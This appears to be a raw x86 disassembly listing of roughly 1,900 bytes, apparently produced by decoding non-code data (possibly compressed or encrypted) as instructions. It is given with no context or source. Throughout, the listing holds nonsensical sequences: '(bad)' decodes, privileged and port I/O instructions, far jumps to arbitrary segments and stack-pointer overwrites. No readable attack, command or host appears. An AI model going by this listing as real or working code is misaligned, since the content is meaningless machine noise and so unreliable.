  421c40:	imul   esi,DWORD PTR [ebp+0x29],0xb2a96e9
  421c47:	outs   dx,BYTE PTR ds:[esi]
  421c48:	shl    DWORD PTR ds:0x7d45eda6,0x1f
  421c4f:	fiadd  DWORD PTR [ecx]
  421c51:	int3   
  421c52:	leave  
  421c53:	retf   0x38d6
  421c56:	imul   eax,edi,0xe97ea1b9
  421c5c:	adc    al,0x1
  421c5e:	pop    es
  421c5f:	test   DWORD PTR [edi+0x24f955e9],0xfde73912
  421c69:	ins    DWORD PTR es:[edi],dx
  421c6a:	mov    ch,BYTE PTR [ecx+0x6f]
  421c6d:	push   edx
  421c6e:	daa    
  421c6f:	cmp    BYTE PTR [edi-0x3a],dl
  421c72:	pop    edx
  421c73:	mov    DWORD PTR ds:0xa787d3ba,esi
  421c79:	stc    
  421c7a:	jno    0x421cef
  421c7c:	jnp    0x421cdc
  421c7e:	stos   DWORD PTR es:[edi],eax
  421c7f:	icebp  
  421c80:	out    0xa7,eax
  421c82:	shl    BYTE PTR [esi+0x6359f88f],1
  421c88:	mov    ds:0x5170f2df,eax
  421c8d:	aaa    
  421c8e:	aam    0xd0
  421c90:	xor    BYTE PTR [ebx+0xd],cl
  421c93:	sbb    BYTE PTR ds:0xa1a09982,bl
  421c99:	ffreep st(3)
  421c9b:	push   0xad3dca5a
  421ca0:	push   ecx
  421ca1:	loopne 0x421c76
  421ca3:	sbb    eax,0xf647bcad
  421ca8:	push   ebx
  421ca9:	and    bh,BYTE PTR [esp+eiz*2+0x6b]
  421cad:	or     esi,edx
  421caf:	stc    
  421cb0:	jp     0x421d15
  421cb2:	inc    edx
  421cb3:	sub    DWORD PTR ds:0x35148277,edi
  421cb9:	imul   eax,DWORD PTR [edx-0x32c8d4cd],0x90faea41
  421cc3:	arpl   WORD PTR [ebx+0x4439e9a4],si
  421cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cca:	std    
  421ccb:	inc    ecx
  421ccc:	repz sub BYTE PTR [ebp+0x1c69af9b],bh
  421cd3:	pusha  
  421cd4:	dec    esi
  421cd5:	sahf   
  421cd6:	mov    DWORD PTR ds:0xfa0953ac,esp
  421cdc:	mov    bl,0xc5
  421cde:	xchg   edx,eax
  421cdf:	mov    ah,0xcd
  421ce1:	out    dx,al
  421ce2:	ja     0x421cbb
  421ce4:	call   0x54cce80c
  421ce9:	call   0xdccd:0x8dabbf59
  421cf0:	and    al,0xa9
  421cf2:	pop    ebx
  421cf3:	mov    dh,BYTE PTR [edi]
  421cf5:	and    edi,DWORD PTR [ebp+eax*2+0x4c39c0f]
  421cfc:	mov    dl,0x92
  421cfe:	ja     0x421ca2
  421d00:	cmp    BYTE PTR [ebx],bh
  421d02:	add    esp,ebx
  421d04:	mov    eax,0x8354da5c
  421d09:	push   ds
  421d0a:	xchg   BYTE PTR [ebx+0x24],ch
  421d0d:	xor    al,0xce
  421d0f:	rol    BYTE PTR [edx-0x41f52798],0xd
  421d16:	jg     0x421ce7
  421d18:	sbb    eax,0x1bb6d28f
  421d1d:	xor    BYTE PTR [edi],bh
  421d1f:	and    DWORD PTR [ecx+0x2b],esp
  421d22:	repz mov al,es:0x2cb997ca
  421d29:	jne    0x421cae
  421d2b:	sbb    dh,BYTE PTR [ecx]
  421d2d:	not    ah
  421d2f:	retf   
  421d30:	pop    ecx
  421d31:	das    
  421d32:	cmc    
  421d33:	pop    esi
  421d34:	push   esi
  421d35:	sbb    edx,DWORD PTR [ecx+ebp*2]
  421d38:	mov    edx,0xd8c00e8e
  421d3d:	or     bl,BYTE PTR [esi]
  421d3f:	in     al,0xe1
  421d41:	adc    eax,0xb76ac146
  421d46:	add    esi,0x70
  421d49:	sbb    bh,bh
  421d4b:	push   ecx
  421d4c:	loop   0x421d1d
  421d4e:	mov    ah,0xa1
  421d50:	inc    ebp
  421d51:	mov    esp,0xad3df318
  421d56:	bound  ebp,QWORD PTR [eax]
  421d58:	cdq    
  421d59:	sub    BYTE PTR [ebp-0x33],0x97
  421d5d:	in     eax,dx
  421d5e:	add    BYTE PTR [ebx-0x23],0x39
  421d62:	mov    edi,0xcb42c9b3
  421d67:	and    ah,ch
  421d69:	arpl   WORD PTR [esi+0x49],ax
  421d6c:	xchg   ebp,eax
  421d6d:	out    0xad,eax
  421d6f:	adc    esp,DWORD PTR [eax]
  421d71:	popa   
  421d72:	dec    ebp
  421d73:	jg     0x421da7
  421d75:	mov    DWORD PTR [ebx-0x736de2b6],0xda05e1f5
  421d7f:	arpl   sp,bx
  421d81:	arpl   WORD PTR [ebp-0x6892d015],di
  421d87:	add    ebx,ebp
  421d89:	outs   dx,DWORD PTR ds:[esi]
  421d8a:	mov    dl,0x5
  421d8c:	rol    DWORD PTR [edi+ebp*4+0x12c0cc30],cl
  421d93:	pop    edx
  421d94:	dec    edi
  421d95:	cmp    BYTE PTR [ebx+ebx*4+0x45],dh
  421d99:	mov    dh,0x63
  421d9b:	or     DWORD PTR [ebx+0x67],edi
  421d9e:	jbe    0x421d8e
  421da0:	in     eax,dx
  421da1:	ins    DWORD PTR es:[edi],dx
  421da2:	icebp  
  421da3:	or     eax,0x3597ae37
  421da8:	pop    ecx
  421da9:	xor    BYTE PTR [ebx-0xe883a29],ch
  421daf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421db0:	cwde   
  421db1:	push   ebx
  421db2:	fs aaa 
  421db4:	in     al,dx
  421db5:	pop    edx
  421db6:	sbb    ch,bh
  421db8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421db9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dba:	dec    eax
  421dbb:	addr16 pop ebp
  421dbd:	dec    ecx
  421dbe:	xchg   ebx,eax
  421dbf:	retfw  0xe57
  421dc3:	dec    eax
  421dc4:	jecxz  0x421d54
  421dc6:	cmp    ah,BYTE PTR [ebp+0x14839bc1]
  421dcc:	inc    BYTE PTR [ecx-0x6d84b55d]
  421dd2:	sti    
  421dd3:	pop    esp
  421dd4:	outs   dx,BYTE PTR ds:[esi]
  421dd5:	sub    esi,DWORD PTR [edx+0x3d]
  421dd8:	aas    
  421dd9:	mov    bh,0xaa
  421ddb:	xor    eax,0x2a6c189c
  421de0:	mov    edx,0x5c599535
  421de5:	cmp    esi,DWORD PTR [eax]
  421de7:	hlt    
  421de8:	es or  al,0xf9
  421deb:	iret   
  421dec:	mov    edx,0x378f1a01
  421df1:	repnz dec eax
  421df3:	jg     0x421e1f
  421df5:	in     al,0x5d
  421df7:	imul   edx,DWORD PTR [ebx],0xfc45ae7b
  421dfd:	or     cl,BYTE PTR [esi+0x5e]
  421e00:	xor    DWORD PTR [ecx-0x68],eax
  421e03:	(bad)  
  421e05:	push   ebp
  421e06:	cdq    
  421e07:	inc    ebx
  421e08:	push   edx
  421e09:	sbb    al,0x3b
  421e0b:	jecxz  0x421e6d
  421e0d:	and    edx,DWORD PTR ds:0xf213c1a6
  421e13:	sar    BYTE PTR [ebp-0x29],1
  421e16:	jae    0x421e1a
  421e18:	cmp    DWORD PTR [esi],esp
  421e1a:	fs pop eax
  421e1c:	mov    esp,0x7cb989d1
  421e21:	jnp    0x421e77
  421e23:	cld    
  421e24:	call   FWORD PTR [edi]
  421e26:	mov    ebx,0x5a1bb807
  421e2b:	test   eax,0x27ea4283
  421e30:	sub    BYTE PTR ds:0xf488c949,0x1
  421e37:	inc    esi
  421e38:	loop   0x421e3d
  421e3a:	jne    0x421dbe
  421e3c:	hlt    
  421e3d:	rcr    DWORD PTR [eax],1
  421e3f:	inc    ebp
  421e40:	iret   
  421e41:	ret    
  421e42:	mov    WORD PTR [ebx-0x67],?
  421e45:	pop    edi
  421e46:	jg     0x421e03
  421e48:	mov    bl,0xa3
  421e4a:	jp     0x421ea3
  421e4c:	pop    eax
  421e4d:	sbb    edx,DWORD PTR [edx+esi*2+0x2e]
  421e51:	sbb    BYTE PTR ds:0xfea619b2,0x5a
  421e58:	fwait
  421e59:	addr16 mov ebx,0xc8ce89e4
  421e5f:	inc    eax
  421e60:	inc    esp
  421e61:	add    esi,DWORD PTR [esi]
  421e63:	out    0x68,al
  421e65:	push   eax
  421e66:	clc    
  421e67:	and    ecx,DWORD PTR [eax-0x76]
  421e6a:	xor    BYTE PTR [eax-0x22],cl
  421e6d:	mov    cl,0x4d
  421e6f:	mov    WORD PTR [edi+ecx*2-0x41],fs
  421e73:	(bad)  
  421e74:	push   0xffffffbe
  421e76:	outs   dx,DWORD PTR ds:[esi]
  421e77:	sahf   
  421e78:	bnd jae 0x421e85
  421e7b:	mov    bh,0x19
  421e7d:	popf   
  421e7e:	sbb    eax,0xe8f2fb15
  421e83:	imul   eax,DWORD PTR [edx],0xb169a1bc
  421e89:	cmp    DWORD PTR [eax-0x33],ebp
  421e8c:	dec    ebx
  421e8d:	in     al,0x6e
  421e8f:	mov    ds,WORD PTR [edi+0x3f]
  421e92:	dec    eax
  421e93:	test   al,0xfe
  421e95:	mov    WORD PTR [ebx],ds
  421e97:	arpl   WORD PTR [ecx],bp
  421e99:	stos   BYTE PTR es:[edi],al
  421e9a:	lock ret 0x3146
  421e9e:	std    
  421e9f:	leave  
  421ea0:	xor    BYTE PTR [edi-0x53],bl
  421ea3:	mov    ds:0xb5ffc660,al
  421ea8:	ins    DWORD PTR es:[edi],dx
  421ea9:	adc    cl,BYTE PTR [ecx*4+0x735f0095]
  421eb0:	stc    
  421eb1:	mov    ebp,0x3d2a3e2f
  421eb6:	jo     0x421ebc
  421eb8:	pcmpeqb mm0,QWORD PTR [eax+0x38]
  421ebc:	xchg   DWORD PTR [edi+0x24741a3a],ebx
  421ec2:	inc    ebp
  421ec3:	aad    0x13
  421ec5:	pop    ecx
  421ec6:	xor    DWORD PTR [esi-0x2abe780f],ebp
  421ecc:	pop    es
  421ecd:	mov    esi,0x959d7c3a
  421ed2:	mov    al,ds:0x8495d985
  421ed7:	ja     0x421e7a
  421ed9:	ja     0x421eb9
  421edb:	cmp    dl,BYTE PTR [edi+eiz*1+0x50]
  421edf:	dec    eax
  421ee0:	push   edx
  421ee1:	jmp    0xfa13:0xff362208
  421ee8:	mov    edi,0xc5f34f93
  421eed:	rcr    DWORD PTR [eax+eiz*4-0x2c],1
  421ef1:	adc    ebx,DWORD PTR [ebp-0x4b]
  421ef4:	lods   eax,DWORD PTR ds:[esi]
  421ef5:	imul   edx,DWORD PTR [ecx+0x2c9ee403],0x5ade46b3
  421eff:	and    DWORD PTR [eax],esp
  421f01:	push   ds
  421f02:	xchg   esp,eax
  421f03:	std    
  421f04:	iret   
  421f05:	pushf  
  421f06:	or     dh,ah
  421f08:	and    al,0x9b
  421f0a:	xchg   ecx,eax
  421f0b:	inc    eax
  421f0c:	push   ecx
  421f0d:	rcr    ch,1
  421f0f:	pop    ebx
  421f10:	(bad)  
  421f11:	and    DWORD PTR [edx+0x27],ecx
  421f14:	mov    ah,0xee
  421f16:	das    
  421f17:	fidiv  WORD PTR [ebx-0x18]
  421f1a:	out    0xef,al
  421f1c:	add    DWORD PTR [edx-0x67],edx
  421f1f:	rcr    DWORD PTR [esi],cl
  421f21:	pop    ds
  421f22:	retf   0x10b2
  421f25:	lock push eax
  421f27:	add    esp,DWORD PTR [eax-0x5d]
  421f2a:	pushf  
  421f2b:	jmp    0x54a3035
  421f30:	xchg   BYTE PTR [ebp+0x4075262d],cl
  421f36:	pop    eax
  421f37:	cmp    al,0xd5
  421f39:	sbb    eax,0xd126bb69
  421f3e:	cdq    
  421f3f:	aaa    
  421f40:	ja     0x421ede
  421f42:	push   0x16
  421f44:	cmp    DWORD PTR [edi+0x66685817],edi
  421f4a:	out    0x21,eax
  421f4c:	jle    0x421ed6
  421f4e:	stc    
  421f4f:	outs   dx,BYTE PTR ds:[esi]
  421f50:	mov    al,ds:0xd65020f1
  421f55:	xchg   ebx,eax
  421f56:	(bad)  
  421f57:	mov    ch,0x19
  421f59:	ficomp WORD PTR [eax-0x380f1ce1]
  421f5f:	or     al,0x95
  421f61:	push   es
  421f62:	jae    0x421f53
  421f64:	mov    dl,0xbe
  421f66:	push   ss
  421f67:	(bad)  
  421f68:	jl     0x421f08
  421f6a:	jno    0x421fd5
  421f6c:	sub    eax,0xc84a1fa2
  421f71:	fs stos BYTE PTR es:[edi],al
  421f73:	mov    edi,0xdf2b6355
  421f78:	xchg   ecx,eax
  421f79:	ds cdq 
  421f7b:	repz mov cl,0x50
  421f7e:	cmc    
  421f7f:	nop
  421f80:	push   0x62d15df4
  421f85:	popf   
  421f86:	mov    ah,BYTE PTR [esi]
  421f88:	dec    esp
  421f89:	mov    ebp,0x712051fe
  421f8e:	stos   BYTE PTR es:[edi],al
  421f8f:	dec    eax
  421f90:	fnstcw WORD PTR [ebx+eax*4-0x634bd15b]
  421f97:	and    al,0x7c
  421f99:	adc    eax,0x7b1d8a83
  421f9e:	dec    esp
  421f9f:	cmc    
  421fa0:	inc    ebx
  421fa1:	sub    ecx,ecx
  421fa3:	das    
  421fa4:	mov    BYTE PTR [ebx+0x6c],dl
  421fa7:	xor    dl,BYTE PTR [eax+edi*2]
  421faa:	lahf   
  421fab:	nop
  421fac:	fcmovnu st,st(6)
  421fae:	sbb    eax,0x8649d77b
  421fb3:	mov    eax,0xc715289a
  421fb8:	call   0x27b0992
  421fbd:	inc    esp
  421fbe:	adc    DWORD PTR [ecx],edi
  421fc0:	sbb    eax,0x69c6a40d
  421fc5:	xlat   BYTE PTR ds:[ebx]
  421fc6:	and    al,0xbc
  421fc8:	dec    ebx
  421fc9:	retf   0xd650
  421fcc:	or     al,0xe8
  421fce:	ja     0x421faa
  421fd0:	imul   esp,DWORD PTR [edi],0x2895834f
  421fd6:	loope  0x422038
  421fd8:	pop    es
  421fd9:	push   edi
  421fda:	rol    DWORD PTR [edx],0xcc
  421fdd:	adc    al,0xce
  421fdf:	ins    BYTE PTR es:[edi],dx
  421fe0:	cmc    
  421fe1:	sti    
  421fe2:	mov    ds,WORD PTR ds:0x50c7ae8e
  421fe8:	xchg   DWORD PTR [edx],esi
  421fea:	sub    edx,DWORD PTR [eax+esi*4+0x6c]
  421fee:	cmc    
  421fef:	retf   
  421ff0:	xor    eax,0x3356127c
  421ff5:	(bad)  
  421ff6:	inc    ecx
  421ff7:	(bad)  
  421ff8:	mov    ch,dl
  421ffa:	xlat   BYTE PTR ds:[ebx]
  421ffb:	push   edi
  421ffc:	shl    DWORD PTR [esi-0x3d1b5d6f],cl
  422002:	loope  0x421fa5
  422004:	mov    WORD PTR [ecx+0x506897ed],es
  42200a:	in     al,0x6a
  42200c:	lock (bad) 
  42200e:	test   al,0x3a
  422010:	jae    0x421fa6
  422012:	not    bl
  422014:	mov    ah,0xc1
  422016:	inc    ebx
  422017:	mov    DWORD PTR [esi-0x48],ecx
  42201a:	outs   dx,DWORD PTR ds:[esi]
  42201b:	xchg   ebx,eax
  42201c:	and    eax,0xbe974371
  422021:	add    al,BYTE PTR [ebx+0x6391d80a]
  422027:	ja     0x42204f
  422029:	push   edi
  42202a:	bound  eax,QWORD PTR [ecx+eiz*8-0x20]
  42202e:	xchg   edi,eax
  42202f:	add    al,0x5b
  422031:	inc    edx
  422032:	mov    esp,0xe8b1d952
  422037:	icebp  
  422038:	call   0x1d0389c
  42203d:	jne    0x422014
  42203f:	dec    esp
  422040:	xor    DWORD PTR [eax+0x1f],ebx
  422043:	mov    eax,0x5a179afc
  422048:	push   esp
  422049:	cmp    DWORD PTR [esi+0x15],ebp
  42204c:	jge    0x421fef
  42204e:	int3   
  42204f:	pushf  
  422050:	sub    dl,cl
  422052:	or     bh,BYTE PTR [ebx+eiz*2]
  422055:	inc    edi
  422056:	jge    0x422098
  422058:	bound  esi,QWORD PTR [ebx+0x18]
  42205b:	xor    bl,BYTE PTR ds:0x70780475
  422061:	std    
  422062:	shl    BYTE PTR [esi],1
  422064:	loope  0x422014
  422066:	jb     0x422041
  422068:	loope  0x42206a
  42206a:	xor    BYTE PTR [eax],al
  42206c:	(bad)  
  42206e:	pushf  
  42206f:	xor    DWORD PTR [ecx+ecx*8-0x3],eax
  422073:	pusha  
  422074:	aaa    
  422075:	test   edi,ebp
  422077:	sub    bh,0x20
  42207a:	xor    DWORD PTR [esp+ecx*1+0x7d9d27f8],esi
  422081:	cmp    DWORD PTR [edi-0x41c74edc],esp
  422087:	pop    esp
  422088:	test   al,0x9
  42208a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42208b:	bound  esi,QWORD PTR [esi]
  42208d:	mov    dh,0xbb
  42208f:	aas    
  422090:	or     BYTE PTR [ecx+0x33],al
  422093:	xchg   esi,eax
  422094:	addr16 ja 0x42203d
  422097:	jmp    0x3cf4:0x40effe9b
  42209e:	mov    ch,0xb3
  4220a0:	cld    
  4220a1:	xchg   edi,eax
  4220a2:	or     dh,dl
  4220a4:	mov    ebp,0x12d0af0d
  4220a9:	mov    eax,ds:0xa4027d04
  4220ae:	push   edx
  4220af:	inc    esi
  4220b0:	scas   al,BYTE PTR es:[edi]
  4220b1:	out    0x66,eax
  4220b3:	fldcw  WORD PTR [ebx+0x10]
  4220b6:	push   0x81c2cb48
  4220bb:	shl    cl,1
  4220bd:	push   ss
  4220be:	(bad)  
  4220bf:	jns    0x4220e4
  4220c1:	shl    DWORD PTR [bp+si],1
  4220c4:	stos   BYTE PTR es:[edi],al
  4220c5:	inc    ebp
  4220c6:	outs   dx,DWORD PTR ds:[esi]
  4220c7:	xlat   BYTE PTR ds:[ebx]
  4220c8:	push   ss
  4220c9:	sub    al,0xe7
  4220cb:	mov    ?,eax
  4220cd:	out    dx,al
  4220ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220cf:	jle    0x42212c
  4220d1:	and    al,0x56
  4220d3:	sbb    al,0xc3
  4220d5:	int3   
  4220d6:	mov    bl,BYTE PTR [edi]
  4220d8:	dec    edx
  4220d9:	ins    BYTE PTR es:[edi],dx
  4220da:	xlat   BYTE PTR ds:[ebx]
  4220db:	aas    
  4220dc:	mov    al,0x9d
  4220de:	in     eax,dx
  4220df:	or     eax,0xfe28470f
  4220e4:	imul   esp,DWORD PTR [esi-0x2bd1591c],0xde1626a6
  4220ee:	in     al,dx
  4220ef:	add    BYTE PTR [edx+0x402fb610],cl
  4220f5:	cmp    BYTE PTR [eax+0x2664c11e],dh
  4220fb:	xor    ebp,DWORD PTR [ecx]
  4220fd:	stc    
  4220fe:	ja     0x4220bd
  422100:	das    
  422101:	inc    ebx
  422102:	adc    BYTE PTR [ebx+0x16],bl
  422105:	mov    bl,0xcf
  422107:	ins    DWORD PTR es:[edi],dx
  422108:	adc    ebx,DWORD PTR [eax]
  42210a:	inc    ebp
  42210b:	cmp    al,0x7e
  42210d:	retf   0xd5af
  422110:	sbb    BYTE PTR [ecx-0x63],al
  422113:	push   ss
  422114:	sbb    DWORD PTR [edi-0x4c06efa7],ecx
  42211a:	add    bl,ah
  42211c:	and    ch,BYTE PTR [eax-0x7c5ac311]
  422122:	inc    eax
  422123:	cld    
  422124:	xor    BYTE PTR [ecx+0x5dad2920],dh
  42212a:	mov    WORD PTR ds:0xc50feffd,gs
  422130:	mov    fs,eax
  422132:	push   esp
  422133:	inc    esp
  422134:	sbb    eax,0x47b36071
  422139:	push   ss
  42213a:	sahf   
  42213b:	icebp  
  42213c:	js     0x422135
  42213e:	aas    
  42213f:	leave  
  422140:	xor    dl,BYTE PTR [edi]
  422142:	cmp    bh,bh
  422144:	loope  0x4220d6
  422146:	in     eax,0xcd
  422148:	push   eax
  422149:	sbb    DWORD PTR [esi-0x32],edi
  42214c:	jno    0x4221cb
  42214e:	dec    esp
  42214f:	inc    esi
  422150:	lods   eax,DWORD PTR es:[esi]
  422152:	jle    0x422158
  422154:	or     cl,BYTE PTR [eax]
  422156:	mov    ch,0xd4
  422158:	fcmovnbe st,st(2)
  42215a:	out    dx,al
  42215b:	mov    ds:0x6fb4f98e,eax
  422160:	loopne 0x42211d
  422162:	es (bad) 
  422164:	sub    al,0x3d
  422166:	or     eax,0xc0eb9c35
  42216b:	cwde   
  42216c:	push   ss
  42216d:	xchg   ebx,eax
  42216e:	ss int 0x78
  422171:	push   ecx
  422172:	pushf  
  422173:	call   0xb376:0xc52294b8
  42217a:	push   ss
  42217b:	pushf  
  42217c:	js     0x4221c9
  42217e:	sti    
  42217f:	lahf   
  422180:	shl    BYTE PTR [eax-0x17a04d57],cl
  422186:	shr    bh,1
  422188:	js     0x422190
  42218a:	ins    DWORD PTR es:[edi],dx
  42218b:	retf   
  42218c:	xor    al,0x35
  42218e:	js     0x4221b6
  422190:	mov    bh,0x46
  422192:	nop
  422193:	nop
  422194:	jb     0x422196
  422196:	inc    ebx
  422197:	jmp    0xdb56:0xdc36faec
  42219e:	aad    0xb
  4221a0:	pop    ds
  4221a1:	add    edi,DWORD PTR [edx]
  4221a3:	inc    eax
  4221a4:	in     al,0x46
  4221a6:	cmp    DWORD PTR [ebx+0x3b],0x4ee70eed
  4221ad:	retf   
  4221ae:	push   edi
  4221b0:	mov    bl,0x54
  4221b2:	inc    edi
  4221b3:	push   cs
  4221b4:	mov    ch,0xa9
  4221b6:	repz fcomp DWORD PTR [ecx+eax*4+0x40d23cb7]
  4221be:	push   es
  4221bf:	push   ecx
  4221c0:	xor    bl,BYTE PTR [ecx+ebp*4-0x1a5445b4]
  4221c7:	and    ch,ch
  4221c9:	sbb    al,0xce
  4221cb:	xchg   DWORD PTR [ebp+0x6127166],edi
  4221d1:	and    DWORD PTR [ebx*8+0x599e6a27],eax
  4221d8:	or     eax,0xa2b58fe3
  4221dd:	add    al,0xb
  4221df:	mov    ds:0x116989f9,eax
  4221e4:	mov    al,0x8f
  4221e6:	cmc    
  4221e7:	test   DWORD PTR [edx],edi
  4221e9:	(bad)  
  4221ea:	and    DWORD PTR [ebx-0x69f3da0a],ebx
  4221f0:	push   edx
  4221f1:	add    esp,DWORD PTR [eax-0x29]
  4221f4:	ret    
  4221f5:	popf   
  4221f6:	cmp    BYTE PTR [ebx+0x32],0x55
  4221fa:	inc    DWORD PTR [edi-0x661caf36]
  422200:	or     eax,0x2d872beb
  422205:	fwait
  422206:	xor    eax,0x7588b3d6
  42220b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42220c:	jo     0x4221c6
  42220e:	in     eax,0xae
  422210:	call   0xcf940678
  422215:	and    DWORD PTR ds:0x58fcbc25,0x46ca94c6
  42221f:	pop    ebp
  422220:	out    0x75,eax
  422222:	inc    esi
  422223:	dec    ecx
  422224:	into   
  422225:	jmp    0xb2ea:0x4dbbf228
  42222c:	fild   QWORD PTR [ebp-0x710c60b4]
  422232:	ret    
  422233:	mov    ds:0x41b39912,eax
  422238:	push   es
  422239:	pextrw ebp,(bad),0xc5
  42223b:	imul   eax,DWORD PTR [edi-0x6568ef0f],0x8
  422242:	adc    dh,dh
  422244:	pop    ss
  422245:	retf   
  422246:	fld    TBYTE PTR [ebp+eax*2+0xf]
  42224a:	sbb    BYTE PTR [ecx],bl
  42224c:	inc    esi
  42224d:	jecxz  0x4221ea
  42224f:	outs   dx,DWORD PTR ds:[si]
  422251:	icebp  
  422252:	or     eax,0xdb909e0a
  422257:	scas   al,BYTE PTR es:[edi]
  422258:	adc    eax,DWORD PTR [edx+0x5f782199]
  42225e:	stc    
  42225f:	pop    ecx
  422260:	imul   edx,ebp,0xffffffef
  422263:	lock nop
  422265:	loop   0x422213
  422267:	and    esp,DWORD PTR [esp+eax*8+0x1e]
  42226b:	loopne 0x4222a0
  42226d:	and    al,0xcf
  42226f:	daa    
  422270:	mov    al,0x77
  422272:	or     al,0xf3
  422274:	pop    eax
  422275:	aas    
  422276:	jne    0x4222eb
  422278:	and    DWORD PTR [esi+0x43],edx
  42227b:	mov    esi,0x6a954237
  422280:	int3   
  422281:	popf   
  422282:	add    BYTE PTR [edx-0xa],ch
  422285:	aas    
  422286:	lock adc edx,eax
  422289:	xlat   BYTE PTR ds:[ebx]
  42228a:	ds popa 
  42228c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42228d:	into   
  42228e:	mov    eax,ds:0xfff69ecd
  422293:	iret   
  422294:	or     DWORD PTR [esp+eiz*4+0x1e],esp
  422298:	add    ch,BYTE PTR [edx]
  42229a:	(bad)  
  42229b:	sahf   
  42229c:	push   ds
  42229d:	xchg   BYTE PTR [eax],dl
  42229f:	adc    dl,ah
  4222a1:	jbe    0x4222b5
  4222a3:	pop    ds
  4222a4:	mov    bl,BYTE PTR [ebx-0xd5aeac8]
  4222aa:	sbb    DWORD PTR [ecx],ebx
  4222ac:	(bad)  
  4222ad:	stos   BYTE PTR es:[edi],al
  4222ae:	or     al,BYTE PTR [edi+edi*1+0x75c2e720]
  4222b5:	push   ss
  4222b6:	mov    al,ds:0xc5ab2967
  4222bb:	fmul   DWORD PTR [ebp+0x32]
  4222be:	dec    edi
  4222bf:	not    BYTE PTR [esi+0x1a239d1a]
  4222c5:	cmp    eax,esi
  4222c7:	push   ebx
  4222c8:	stos   DWORD PTR es:[edi],eax
  4222c9:	mov    ds:0x6c0f5748,al
  4222ce:	lods   eax,DWORD PTR ds:[esi]
  4222cf:	cld    
  4222d0:	sbb    BYTE PTR [ebx-0x12],bh
  4222d3:	mov    BYTE PTR [ecx],bh
  4222d5:	mov    eax,0x919fb716
  4222da:	cdq    
  4222db:	loope  0x422352
  4222dd:	push   0xffffff86
  4222df:	fsubr  st(1),st
  4222e1:	pop    edx
  4222e2:	mov    bl,BYTE PTR [ebp+0x7a]
  4222e5:	sub    al,0x4e
  4222e7:	push   ecx
  4222e8:	jae    0x422302
  4222ea:	sbb    bl,0x56
  4222ed:	and    al,BYTE PTR [edi+0x14f40dd9]
  4222f3:	xlat   BYTE PTR ds:[ebx]
  4222f4:	mov    DWORD PTR [ecx],edx
  4222f6:	add    ebp,ecx
  4222f8:	or     BYTE PTR [ebx],bl
  4222fa:	(bad)  
  4222fb:	cmc    
  4222fc:	xor    al,0xb8
  4222fe:	sub    al,BYTE PTR [ecx-0x3a]
  422301:	or     DWORD PTR [esi+eiz*4-0x59],0x59434494
  422309:	dec    edi
  42230a:	inc    eax
  42230b:	xor    DWORD PTR [eax],edx
  42230d:	mov    al,0xed
  42230f:	ins    BYTE PTR es:[edi],dx
  422310:	mov    cl,0x26
  422312:	jmp    0x4222bf
  422314:	dec    eax
  422315:	mov    ds:0x806c472c,al
  42231a:	sub    bl,BYTE PTR [edx+edx*2+0x35]
  42231e:	xor    BYTE PTR [esi],ch
  422320:	dec    ebp
  422321:	xor    eax,0xb482b1ae
  422326:	mov    dh,dl
  422328:	push   0x536e24b9
  42232d:	push   ebx
  42232e:	stc    
  42232f:	mov    esp,0xb4dbb2ed
  422334:	sbb    esi,DWORD PTR [eax]
  422336:	inc    ebx
  422337:	or     ecx,DWORD PTR [ebp+0x5c]
  42233a:	jmp    0x8fa013f1
  42233f:	jcxz   0x4222cf
  422342:	adc    eax,DWORD PTR [esi]
  422344:	loope  0x4223a1
  422346:	fcmovb st,st(1)
  422348:	scas   eax,DWORD PTR es:[edi]
  422349:	(bad)  
  42234a:	push   eax
  42234b:	xor    ebx,ebx
  42234d:	pop    edx
  42234e:	add    eax,0x41397820
  422353:	pop    es
  422354:	in     eax,0x55
  422356:	les    ebp,FWORD PTR [ebx+0x6ad61a9a]
  42235c:	jbe    0x42235b
  42235e:	xchg   esi,eax
  42235f:	pushf  
  422360:	sub    dl,al
  422362:	test   DWORD PTR ds:0x2b064e41,edx
  422368:	cdq    
  422369:	xor    ax,0xc4ca
  42236d:	repz jne 0x4223b1
  422370:	dec    ebp
  422371:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422372:	mov    ecx,0x3468017f
  422377:	xor    edx,edx
  422379:	call   0xfe58:0x482afde0
  422380:	mov    al,0xe5
  422382:	adc    eax,0x8711855c
  422387:	dec    esi
  422388:	push   esi
  422389:	pop    ds
  42238a:	xlat   BYTE PTR ds:[ebx]
  42238b:	mul    DWORD PTR [eax]
  42238d:	in     eax,0xaa
  42238f:	repnz or al,dl
  422392:	jb     0x4223aa
  422394:	pop    esp
  422395:	mov    edi,0xb7dcbbd1
  42239a:	inc    ebx
  42239b:	jg     0x422396
  42239d:	dec    edx
  42239e:	mov    esi,ecx
  4223a0:	into   
  4223a1:	add    eax,0x3060b60f
  4223a6:	xor    ch,BYTE PTR [ecx-0x344a0586]
  4223ac:	push   0xffffffdb
  4223ae:	cmp    ch,dl
  4223b0:	jno    0x4223c3
  4223b2:	div    cl
  4223b4:	in     eax,0x3
  4223b6:	pop    esi
  4223b7:	stc    
  4223b8:	mov    ebx,0x12c4b50c
  4223bd:	enter  0xa28a,0xa4
  4223c1:	xlat   BYTE PTR ds:[ebx]
  4223c2:	or     ebp,DWORD PTR [ebx+ebp*2-0x2f]
  4223c6:	xchg   ebx,eax
  4223c7:	push   ecx
  4223c8:	push   esi
  4223c9:	aaa    
  4223ca:	stos   BYTE PTR es:[edi],al
  4223cb:	ret    
  4223cc:	rcr    BYTE PTR [esi-0x6f],cl
  4223cf:	jno    0x42243c
  4223d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223d2:	push   0x53c054d3
  4223d7:	call   DWORD PTR [ebx+0x34]
  4223da:	inc    esi
  4223db:	iret   
  4223dc:	dec    esp
  4223dd:	and    ch,bl
  4223df:	xor    eax,0xbd46b348
  4223e4:	enter  0x1cf,0xaa
  4223e8:	and    DWORD PTR [ebp+0x24],ecx
  4223eb:	scas   al,BYTE PTR es:[edi]
  4223ec:	stos   BYTE PTR es:[edi],al
  4223ed:	icebp  
  4223ee:	sub    al,0x49
  4223f0:	push   cs
  4223f1:	and    edi,DWORD PTR [edi-0x59]
